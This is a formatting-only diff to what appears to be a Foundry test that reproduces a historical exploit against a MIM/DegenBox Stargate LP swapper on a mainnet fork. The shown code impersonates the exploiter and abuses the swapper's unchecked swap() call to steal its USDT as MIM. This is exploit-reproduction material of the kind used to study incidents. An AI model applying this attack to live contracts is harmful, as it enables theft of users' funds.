@@ -35,14 +35,13 @@ interface ISwapper {
 }
 
 contract MIMTest is Test {
-
     struct CurveData {
         address curveAddress;
         bytes4 exchangeFunctionSelector;
         int128 fromCoinIdx;
         int128 toCoinIdx;
     }
-    
+
     address CurveAddress = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
     bytes4 CurveFunctionSelector = bytes4(keccak256(bytes("exchange_underlying(int128,int128,uint256,uint256)")));
     int128 FromCoinIdx = 3;
@@ -54,17 +53,14 @@ contract MIMTest is Test {
     IERC20 MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
     IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IDegenBox DegenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
-    ISwapper ZeroXStargateLPSwapper =
-        ISwapper(0xa5564a2d1190a141CAC438c9fde686aC48a18A79);
-    address private constant curveLiquidityProvider =
-        0x561B94454b65614aE3db0897B74303f4aCf7cc75;
+    ISwapper ZeroXStargateLPSwapper = ISwapper(0xa5564a2d1190a141CAC438c9fde686aC48a18A79);
+    address private constant curveLiquidityProvider = 0x561B94454b65614aE3db0897B74303f4aCf7cc75;
     // Exploiter EOA address
-    address private constant exploiter =
-        0x9d4fD681AacBc49D79c6405C9aA70d1afd5aCCF3;
+    address private constant exploiter = 0x9d4fD681AacBc49D79c6405C9aA70d1afd5aCCF3;
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17521638);
+        cheats.createSelectFork("mainnet", 17_521_638);
         deal(address(SUSDT), exploiter, 3e6);
         cheats.startPrank(exploiter);
         SUSDT.approve(address(this), type(uint256).max);
@@ -80,20 +76,12 @@ contract MIMTest is Test {
     // "Transaction" - name taken from the function name of the exploiter contract
     function testTransaction() public {
         emit log_named_decimal_uint(
-            "Exploiter's amount of MIM tokens before attack",
-            MIM.balanceOf(exploiter),
-            MIM.decimals()
-        );
+            "Exploiter's amount of MIM tokens before attack", MIM.balanceOf(exploiter), MIM.decimals()
+            );
 
         SUSDT.transferFrom(exploiter, address(this), 3e6);
         SUSDT.approve(address(DegenBox), type(uint256).max);
-        DegenBox.deposit(
-            address(SUSDT),
-            address(this),
-            address(ZeroXStargateLPSwapper),
-            0,
-            2_400_000
-        );
+        DegenBox.deposit(address(SUSDT), address(this), address(ZeroXStargateLPSwapper), 0, 2_400_000);
 
         // Creating swapData which will be used for calling proxy contract inside vulnerable swap() function.
         // bytes
@@ -112,19 +100,10 @@ contract MIMTest is Test {
 
         // By making call to zeroXEchangeProxy.call(swapData) inside swap function,
         // exploiter could swap the USDT owned by ZeroXStargateLPSwapper contract to MIM tokens in which the recipient is the attacker
-        ZeroXStargateLPSwapper.swap(
-            address(this),
-            address(this),
-            address(this),
-            0,
-            1_920_000,
-            data
-        );
+        ZeroXStargateLPSwapper.swap(address(this), address(this), address(this), 0, 1_920_000, data);
 
         emit log_named_decimal_uint(
-            "Exploiter's amount of MIM tokens after attack",
-            MIM.balanceOf(exploiter),
-            MIM.decimals()
-        );
+            "Exploiter's amount of MIM tokens after attack", MIM.balanceOf(exploiter), MIM.decimals()
+            );
     }
 }
